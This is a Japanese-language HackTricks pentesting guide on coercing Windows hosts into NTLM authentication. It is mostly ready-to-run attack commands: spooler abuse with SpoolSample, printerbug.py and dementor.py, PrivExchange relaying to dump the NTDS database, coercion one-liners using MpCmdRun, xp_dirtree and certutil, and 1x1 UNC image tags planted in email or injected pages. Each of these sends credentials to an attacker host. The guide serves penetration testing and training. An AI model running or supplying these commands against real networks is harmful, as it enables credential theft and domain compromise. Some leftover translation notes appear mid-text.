# NTLM特権認証を強制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**PEASSの最新バージョンにアクセス**したいですか、または**HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけてください
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
* **ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)は、**MIDLコンパイラ**を使用してC#でコーディングされた**リモート認証トリガーのコレクション**です。これにより、第三者の依存関係を回避できます。

## スプーラーサービスの悪用

_**Print Spooler**_サービスが**有効**になっている場合、既知のAD資格情報を使用して、**ドメインコントローラーのプリントサーバーに新しい印刷ジョブの更新を要求**し、**通知を特定のシステムに送信**することができます。\
プリンターが任意のシステムに通知を送信するとき、そのシステムに**対して認証する必要があります**。したがって、攻撃者は_**Print Spooler**_サービスを任意のシステムに認証させ、この認証でサービスは**コンピューターアカウント**を使用します。

### ドメイン上のWindowsサーバーの検索

PowerShellを使用して、Windowsボックスのリストを取得します。通常、サーバーが優先されるため、そこに焦点を当てましょう：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### スプーラーサービスのリスニングを見つける

やや修正された @mysmartlogin's (Vincent Le Toux's) の [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) を使用して、スプーラーサービスがリスニングしているかどうかを確認します：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
以下は、Windowsハードニング/Active Directory方法論/printers-spooler-service-abuse.mdからのコンテンツです。

```plaintext
You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
```

日本語訳：

```plaintext
Linux上でrpcdump.pyを使用し、MS-RPRNプロトコルを探すこともできます
```
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### 任意のホストに対してサービスに認証を要求する

[ここから**SpoolSampleをコンパイルできます**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**。**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
または、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用します（Linuxの場合）
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Unconstrained Delegationと組み合わせる

もし攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を利用してコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに認証させることができます**。Unconstrained Delegationにより、**プリンタのコンピュータアカウントのTGT**がUnconstrained Delegationを持つコンピュータの**メモリに保存されます**。攻撃者はすでにこのホストを侵害しているため、このチケットを**取得して悪用することができます** ([Pass the Ticket](pass-the-ticket.md))。

## RCP Force authentication

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

`PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、Exchangeサーバはメールボックスを持つ任意のドメインユーザによって、HTTP経由でクライアント提供のホストに強制的に認証されることが可能です。

デフォルトでは、**ExchangeサービスはSYSTEMとして実行**され、過剰な権限が与えられています（具体的には、**2019年以前の累積更新プログラムではドメインのWriteDacl権限が与えられています**）。この欠陥は、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出する**ことを可能にするよう悪用される可能性があります。LDAPへの中継ができない場合でも、この欠陥を使用してドメイン内の他のホストに中継および認証することができます。この攻撃の成功により、認証されたドメインユーザアカウントを使用して、Domain Adminへの直接アクセスが可能となります。

## Inside Windows

Windowsマシン内部にすでにいる場合、特権アカウントを使用してWindowsをサーバに接続するように強制することができます:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
または、別のテクニックを使用する: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

certutil.exe lolbin（Microsoftによって署名されたバイナリ）を使用してNTLM認証を強制することができます:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTMLインジェクション

### メール経由

コンプロマイズしたいマシンにログインするユーザーの**メールアドレス**を知っている場合、以下のような**1x1の画像が埋め込まれたメール**を送信することができます。
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
### MitM

コンピュータに対してMitM攻撃を実行できる場合、彼が視覚化するページにHTMLを注入することができます。次のような画像をページに注入してみることができます：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## NTLMv1のクラック

[NTLMv1のチャレンジをキャプチャできる場合は、こちらを参照してクラック方法を確認してください](../ntlm/#ntlmv1-attack)。\
_**NTLMv1をクラックするには、Responderのチャレンジを "1122334455667788" に設定する必要があることを覚えておいてください。**_
